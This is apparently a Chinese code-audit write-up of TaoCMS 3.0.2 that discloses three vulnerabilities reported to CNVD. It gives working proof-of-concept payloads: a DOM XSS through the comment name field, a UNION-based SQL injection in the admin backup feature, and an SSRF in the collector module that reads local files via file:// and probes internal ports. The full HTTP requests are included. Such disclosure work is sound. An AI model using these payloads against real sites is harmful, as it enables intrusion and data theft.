## 前言

大家好，我是A2Cai  
今天给大家带来的是 TaoCMS 的代码审计  
这是我审的第一个 CMS，如果有错误请大家多多包涵  
PS: 版本是 TaoCMS 3.0.2，本文审到的都是我网络上没找到的，均已提交 CNVD。

## 前台 DOM 型 XSS

> 有点难受的是，我一开始以为这是个存储型 XSS（所以文章是这么来的呜呜呜  
>  结果后面看了下实际是 DOM 型的 XSS...危害一下子降到底了  
>  因为这个漏洞产生的原因是 后端过滤不严谨 + 前端直接操作节点属性 导致的  
>  不死心的我又跑去后台看了一下 ，看看有没有解析...答案是否定的  
>  所以说防御 XSS 漏洞需要对输入和输出进行防御....  
>  即便传进去 XSS Poc 了也执行不了呜呜呜呜

### 漏洞复现

首先，点击首页任意一篇文章，这里就选一开始默认的文章

![](./img/5577287517415697392.png)

往下拉发现有个评论功能

![](./img/4568859388110991814.png)

依次填入以下poc：

姓名：aaa')+alert(1)+('  
邮箱：www.gdit.edu.cn@qq.com  
网址：www.baidu.com  
验证码：按要求输入  
评论：随意

然后点击提交评论  
看到上面被插入了用户的留言，然后点击 回复

![](./img/1873037177620680781.png)

发现 XSS poc 被触发

![](./img/7148969178286179833.png)

### 代码审计

这儿的功能在 Model/Comment.php 下被实现

![](./img/7794540953635598347.png)

通过抓包，我们可以看到 姓名 这个的参数名是 name

![](./img/138568894477171764.png)

在代码中不难发现，name 参数是使用 safeword 方法进行了两次过滤处理

![](./img/29520701422156957.png)

跟踪到 safeword 方法

![](./img/4016760852243520477.png)

level 3 和 level 5 两个等级的 safeword 方法对传入的字符串进行了以下处理：

  1. strip_tags 去除所有 HTML、XML、PHP 的标签。
  2. htmlspecialchars 把预定义的字符转换成 HTML 实体。
  3. nl2br 把字符串中的 \n 转换成 \  
。

但这种过滤防护忽略了一种情况：  
就是当用户的输入会被插入在 HTML 标签的属性时，该过滤方法将完全失效。  
回到前端代码，F12 定位到回复的这个超链接中

![](./img/4040235307415688600.png)

定位到 backcomment 函数

![](./img/7399938712845481986.png)

发现它是简单拼接后就直接给节点赋值  
正常情况下，用户自定义的名字，会被插入到 backcomment 函数中被两个单引号包括起来  
我们可以通过 ') 来逃逸 backcomment 函数的范围  
由于是 return，所以即便有分号也不会再往后执行  
我们可以通过 + 对 return 的内容进行拼接，就变成下面这个样子

![](./img/1321415421208986432.png)

最后点击回复即可触发 DOM XSS

## SQL 注入

### 漏洞复现

由于这个漏洞点是直接审的代码  
所以也就没这么多过程了  
直接上 Poc

    
    
    GET /admin/admin.php?action=datastore&ctrl=create&bulist=admin+where+id=1+union+select+(user()),2,3,4,5,6,7,8 HTTP/1.1
    Host: phpcode.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://phpcode.com/admin/admin.php?action=datastore&ctrl=display
    Cookie: PHPSESSID=ecfspc92npb6f3napn1j1c11l1; tao_dig27=1682952434
    Upgrade-Insecure-Requests: 1
    

响应包：

![](./img/8521412048361514152.png)

不过后面还是稍微翻了一下  
功能点在这儿

![](./img/4665824318307852.png)

又稍稍上 CNVD 看了一眼，好像没有人和我交一样的（也可能是没公开  
PS：我怎么知道的呢？因为我是直接上 github 翻这套 CMS 的 issue 的，里面有漏洞详细的信息。

### 代码审计

功能实现控制器在 Model/Datastore.php  
漏洞产生点在 create 方法

![](./img/2581089341439856982.png)

这段代码的逻辑，大体上是通过 GET 获取 bulist 参数的值  
对 bulist 参数的值进行分割，然后分批读取数据库内的所有表的所有数据  
并写入到 backup-xxxxx.sql 中供用户下载  
简而言之，就是一个数据库的备份功能  
但这里并没有对 bulist 的值进行任何过滤，就插入 "select * from " 后面然后执行  
最终会导致 SQL 注入的发生

Poc：

    
    
    http://xxx.com/admin/admin.php?action=datastore&ctrl=create&bulist=admin+where+id=1+union+select+(user()),2,3,4,5,6,7,8
    

注意：Referer 的值要为
[http://xxx.com/admin/admin.php?action=datastore&ctrl=display](http://xxx.com/admin/admin.php?action=datastore&ctrl=display)
,不然会无法执行。

## SSRF

### 漏洞复现

实战从没利用成功的 SSRF 终于让我代审给你捕到了  
麻了，人与人之间要是多点信任，少点防火墙那该有多好啊  
下面是漏洞复现  
登陆后台，进到这个页面

![](./img/7021785597706100752.png)

然后更改为以下配置

![](./img/110492031854613566.png)

点击开始采集

![](./img/1451731786816320805.png)

这个时候如果抓包的话，会发现是服务端返回的信息  
而不是客户端发起的请求，所以是个 SSRF

![](./img/7748093253129591614.png)

然后尝试 file 伪协议读文件  
Poc：file:///D:/1.txt?  
注意：? 号一定得带，至于为啥看后面有讲

![](./img/6464040103602155526.png)

尝试探测端口  
Poc：<http://127.0.0.1:3306/?>

![](./img/4073990259214868977.png)

### 代码审计

这次漏洞点在 Module/Spider.php 的 execute 方法  
定位到 execute 方法（代码有点长我只截关键的...  
发现有个可能有问题的方法 fetchurl

![](./img/2001794762226500596.png)

定位到 fetchurl 方法，如下图所示

![](./img/5236913460302756166.png)

发现就是传入一个链接，然后直接拖取数据的方法  
这种如果没有对传入的链接做出限定的话，很可能会导致 SSRF 漏洞  
这时候可以往回看看，看看 fetchurl 传入的三个参数可不可控，有没被过滤

![](./img/1607634107561273501.png)

发现没有任何的过滤，那就可以说尝试看看 SSRF 了  
不过接下来还要考虑下是否能输出...继续看下去

![](./img/1780106887709137632.png)

这一段的逻辑是：

  1. 看下指定的编码是不是 UTF-8，如果不是就转换。
  2. 使用 preg_match 去获取符合正则的内容，放到 titlearray 数组中，并将其赋值给 data["name"]。
  3. 最后 打印 data["name"] 的值。

所以到了这里，问题就变成了 “如何让获取的内容符合正则表达式呢？”  
这里会发现说，诶这个 titlepreg 的正则是哪来的？  
往上翻会发现有个 createpreg 的方法，定位到这个方法看下

![](./img/6600052232181255479.png)

下面是定位到的 createpreg 方法

![](./img/2648167452165995586.png)

发现这个方法其实很简单，就是字符串替换然后返回个正则表达式嘛  
根据前面的代码可以知道，name 参数的值是被写死的，我们可控的是 preg 参数的值  
我们最后的目的是为了让它返回所有的内容嘛  
所以结合 return 后面的值来看，我们只需要传入 .* 即可  
但这儿还要注意一个点，就是 preg_match 这个函数  
当你传入第三个值的时候，就会将搜索结果填充到第三个参数中  
所以前面的正则表达式还需要加上 () 才能有搜索结果  
最后得到的正则表达式就是 (.*)  
然后找到调用这个方法的业务点（懒得拼接参数

![](./img/5416431330969284072.png)

开代理抓包：

    
    
    GET /admin/admin.php?front=http%3A%2F%2Fwww.baidu.com%2F%3F&start=1&rend=2&back=.htm&each=2&basecode=utf-8&titlepreg=%28.*%29&contentpreg=%28.*%29&cat=0&repword=%E7%AC%91%E5%98%BB%E5%98%BB%7CtaoCMS%0D%0A%E5%BF%AB%E4%B9%90%7C%E9%AB%98%E5%85%B4&llink=1&action=spider&ctrl=execute&Submit=%E5%BC%80%E5%A7%8B%E9%87%87%E9%9B%86&test=1 HTTP/1.1
    Host: phpcode.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://phpcode.com/admin/admin.php?action=spider&ctrl=display
    Cookie: PHPSESSID=ecfspc92npb6f3napn1j1c11l1; tao_dig27=1682952434; caf_ipaddr=3.0.92.142; country=SG; city="Singapore"; expiry_partner=; __gsas=ID=a4732952401d9990:T=1682933879:S=ALNI_MZCN7IrRihmqjkL4o8N7JGsDAxHwQ; pvisitor=c0664828-e038-4d7c-b430-bff02e4113dd
    Upgrade-Insecure-Requests: 1
    

后面就大差不差了，具体的都在上面漏洞复现里展示了  
就还有要注意的一个点...  
是使用 file:// 伪协议去读文件的时候，需要在末尾加个 ? 号或者 # 号  
因为它这个采集数据的时候，会拼接数字作为采集的范围

![](./img/4284889168248045375.png)

urlback 参数可以为空，但 i 参数一定是个整数  
所以要用 ? 或者 # 去注释掉后面拼接的数字  
Poc：file%3A%2F%2F%2FD%3A%2F1.txt%23

